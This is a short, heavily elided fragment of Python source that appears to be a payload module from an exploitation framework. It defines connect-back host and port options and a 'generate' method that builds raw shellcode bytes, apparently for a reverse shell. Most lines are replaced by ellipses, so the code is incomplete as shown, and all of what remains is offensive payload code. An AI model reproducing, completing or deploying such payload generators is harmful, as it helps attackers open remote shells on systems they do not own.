...
class Module(Payload):
    ...
    lhost = OptString('127.0.0.1', 'Connect to IP address', required=True )
    lport = OptPort(5555, 'Bind Port', required=True)
    ...
    def generate(self):
        ...
        shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
